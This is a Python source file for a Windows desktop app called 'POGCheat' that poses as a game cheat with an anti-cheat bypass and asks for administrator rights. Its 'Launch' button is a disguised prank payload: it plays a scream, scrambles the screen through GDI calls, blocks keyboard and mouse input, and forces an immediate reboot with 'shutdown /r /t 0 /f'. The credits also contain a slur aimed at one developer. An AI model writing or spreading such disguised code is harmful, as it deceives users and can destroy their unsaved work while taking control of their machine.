import customtkinter
import os
from PIL import Image
from pygame import mixer
import time
import ctypes
import win32gui
import win32con
import math

current_folder = os.path.dirname(os.path.realpath(__file__))
assets = os.path.join(os.path.dirname(os.path.realpath(__file__)), "assets")

mixer.init()

customtkinter.set_appearance_mode("System")  # Modes: system (default), light, dark
customtkinter.set_default_color_theme("blue")  # Themes: blue (default), dark-blue, green
customtkinter.set_widget_scaling(1)

class NoAdmin(customtkinter.CTk):
    def __init__(self):
        super().__init__()
        self.title("POGCheat")
        self.geometry("460x110")

        self.about_frame_text = customtkinter.CTkTextbox(self, height=70, width=420)
        self.about_frame_text.grid(padx=(20, 20), pady=(20, 20), sticky="nsew")
        self.about_frame_text.insert("0.0", "POGCheat требует права администратора для корректной работы обхода античитов.\nПожалуйста запустите программу с правами администратора.")
        self.about_frame_text.configure(state="disabled")
        self.about_frame_text.bind("<1>", lambda event: self.about_frame_text.focus_set())



class App(customtkinter.CTk):
    def __init__(self):
        super().__init__()
        self.title("POGCheat")
        self.geometry("800x500")

        self.grid_rowconfigure(0, weight=1)
        self.grid_columnconfigure(1, weight=1)

        self.new_window()

        self.logo = customtkinter.CTkImage(Image.open(os.path.join(assets, "poggers.webp")), size=(26, 26))


        self.nav = customtkinter.CTkFrame(self, corner_radius=0)
        self.nav.grid(row=0, column=0, sticky="nsew")
        self.nav.grid_rowconfigure(4, weight=1)

        self.nav_label = customtkinter.CTkLabel(self.nav, text="  POGCheat", image=self.logo,
                                                compound="left", font=customtkinter.CTkFont(size=15))
        self.nav_label.grid(row=0, column=0, padx=20, pady=20)


        self.home_button = customtkinter.CTkButton(self.nav, corner_radius=0, height=40, border_spacing=10, text="Читы",
                                                   fg_color="transparent", text_color=("gray10", "gray90"), hover_color=("gray70", "gray30"),
                                                   anchor="w", command=self.home_button_event)
        self.home_button.grid(row=1, column=0, sticky="ew")
        self.home_button.configure(fg_color=("gray75", "gray25"))

        self.about_button = customtkinter.CTkButton(self.nav, corner_radius=0, height=40, border_spacing=10, text="(Кратко) О программе",
                                                    fg_color="transparent", text_color=("gray10", "gray90"), hover_color=("gray70", "gray30"),
                                                    anchor="w", command=self.about_button_event)
        self.about_button.grid(row=2, column=0, sticky="ew")

        self.devs_button = customtkinter.CTkButton(self.nav, corner_radius=0, height=40, border_spacing=10, text="Разработчики",
                                                      fg_color="transparent", text_color=("gray10", "gray90"), hover_color=("gray70", "gray30"),
                                                      anchor="w", command=self.devs_button_event)
        self.devs_button.grid(row=3, column=0, sticky="ew")


        self.appearance_mode_label = customtkinter.CTkLabel(self.nav, text="Тема", anchor="w")
        self.appearance_mode_label.grid(row=5, column=0, padx=20, pady=(10, 0))

        self.appearance_mode_optionemenu = customtkinter.CTkOptionMenu(self.nav, values=[ "Система", "Светлая", "Тёмная"],
                                                                       command=self.change_appearance_mode_event)
        self.appearance_mode_optionemenu.grid(row=6, column=0, padx=20, pady=(10, 10))


        self.scaling_label = customtkinter.CTkLabel(self.nav, text="Размер интерфейса", anchor="w")
        self.scaling_label.grid(row=7, column=0, padx=20, pady=(10, 0))

        self.scaling_optionemenu = customtkinter.CTkOptionMenu(self.nav, values=["80%", "90%", "100%", "110%", "120%", "Режим бабушки"],
                                                               command=self.change_scaling_event)
        self.scaling_optionemenu.grid(row=8, column=0, padx=20, pady=(10, 20))


        self.home_frame = customtkinter.CTkFrame(self, corner_radius=0, fg_color="transparent")
        self.home_frame.grid(row=0, column=1, sticky="nsew")
        self.home_frame.grid_columnconfigure(0, weight=1)

        self.home_frame_large_image_label = customtkinter.CTkLabel(self.home_frame, text="", image=self.logo)
        self.home_frame_large_image_label.grid(row=0, column=0, padx=20, pady=10)

        self.launch_button = customtkinter.CTkButton(self.home_frame, text=" Launch", image=self.logo,
                                                     command=self.trigger_crash)
        self.launch_button.grid(row=1, column=0, padx=20, pady=10)


        self.about_frame = customtkinter.CTkFrame(self, corner_radius=0, fg_color="transparent")
        self.about_frame.grid_columnconfigure(0, weight=1)

        self.about_frame_label = customtkinter.CTkLabel(self.about_frame, text="(Кратко) О программе", font=customtkinter.CTkFont(size=32, weight="bold"))
        self.about_frame_label.grid(row=0, column=0, padx=20, pady=10)

        self.about_frame_text = customtkinter.CTkTextbox(self.about_frame, height=260)
        self.about_frame_text.grid(row=1, column=0, padx=(20, 20), pady=(20, 0), sticky="new")
        self.about_frame_text.insert("0.0", "POGCheat это Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magnam aliquam quaerat voluptatem. Ut enim aeque doleamus animo, cum corpore dolemus, fieri tamen permagna accessio potest, si aliquod aeternum et infinitum impendere malum nobis opinemur. Quod idem licet transferre in voluptatem, ut postea variari voluptas distinguique.\n\n\nСпасибо за использование и доверие ❤️\n - Разработчики POGCheat")
        self.about_frame_text.configure(state="disabled")
        self.about_frame_text.bind("<1>", lambda event: self.about_frame_text.focus_set())


        self.devs_frame = customtkinter.CTkFrame(self, corner_radius=0, fg_color="transparent")
        self.devs_frame.grid_columnconfigure(0, weight=1)

        self.devs_frame_label = customtkinter.CTkLabel(self.devs_frame, text="Разработчики", font=customtkinter.CTkFont(size=32, weight="bold"))
        self.devs_frame_label.grid(row=0, column=0, padx=20, pady=10)

        self.devs_frame_text = customtkinter.CTkTextbox(self.devs_frame, height=260)
        self.devs_frame_text.grid(row=1, column=0, padx=(20, 20), pady=(20, 0), sticky="new")
        self.devs_frame_text.insert("0.0", "POGCheat создавали:\n\n" + "- VayLorm - (TODO: add text)\n" + "- dotPast (Джуст который пидор) - (TODO: add text)\n" + "\nПри создании использовались:\n" + " - CustomTkinter\n" + " - что то еще я забыл - dotPast\n\n" + "Оригинал логотипа: Эмоция POGGERS от VoidMakesVids на 7TV (https://7tv.app/emotes/60af1ba684a2b8e655387bba)\n\n\n" + "Создано для НЕДОХАКЕРЫ Lite (https://www.youtube.com/@nedohackerslite)" + "\nPS. - копировать текст из этого поля с помощью CTRL+C")
        self.devs_frame_text.configure(state="disabled")
        self.devs_frame_text.bind("<1>", lambda event: self.devs_frame_text.focus_set())

    

    def change_appearance_mode_event(self, option: str):
        match option:
            case "Система":
                new_appearance_mode = "System"
            case "Светлая":
                new_appearance_mode = "Light"
            case "Тёмная":
                new_appearance_mode = "Dark"
            case _:
                new_appearance_mode = "System"

        customtkinter.set_appearance_mode(new_appearance_mode)

    def change_scaling_event(self, new_scaling: str):
        match new_scaling:
            case "Режим бабушки":
                new_scale = 4
            case _:
                new_scale = int(new_scaling.replace("%", "")) / 100
        
        customtkinter.set_widget_scaling(new_scale)

    def home_button_event(self):
        self.pick_frame("home")

    def trigger_crash(self):
        mixer.music.load('assets/scream.mp3')
        mixer.music.play()

        # Code from https://github.com/Leo-Aqua/Python-gdi-repo
        user32 = ctypes.windll.user32
        user32.SetProcessDPIAware()
        [sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)] 
        hdc = win32gui.GetDC(0)
        dx = dy = 1
        angle = 0
        size = 1
        speed = 5
        for i in range(15):
            win32gui.BitBlt(hdc, 0, 0, sw, sh, hdc, dx,dy, win32con.SCRAND)
            dx = math.ceil(math.sin(angle) * size * 10)
            dy = math.ceil(math.cos(angle) * size * 10)
            angle += speed / 10
            if angle > math.pi :
                angle = math.pi * -1
        ctypes.windll.user32.BlockInput(True)
        time.sleep(0.5)
        os.system('shutdown /r /t 0 /f')

    def devs_button_event(self):
        self.pick_frame("devs")

    def about_button_event(self):
        self.pick_frame("about")

    def pick_frame(self, name):
        self.home_button.configure(fg_color=("gray75", "gray25") if name == "home" else "transparent")
        self.devs_button.configure(fg_color=("gray75", "gray25") if name == "devs" else "transparent")
        
        if name == "home":
            self.home_frame.grid(row=0, column=1, sticky="nsew")
        else:
            self.home_frame.grid_forget()

        if name == "devs":
            self.devs_frame.grid(row=0, column=1, sticky="nsew")
        else:
            self.devs_frame.grid_forget()

        if name == "about":
            self.about_frame.grid(row=0, column=1, sticky="nsew")
        else:
            self.about_frame.grid_forget()

    def new_window(self):
        top = customtkinter.CTkToplevel()
        top.title("cherry")
        top.geometry("144x144")

        cherry = customtkinter.CTkImage(Image.open(os.path.join(assets, 'cherry.jpg')))


if __name__ == "__main__":
    try:
        is_admin = (os.getuid == 0)
    except:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    if is_admin:
        app = App()
    else:
        app = NoAdmin()
    
    print(is_admin)

    app.mainloop()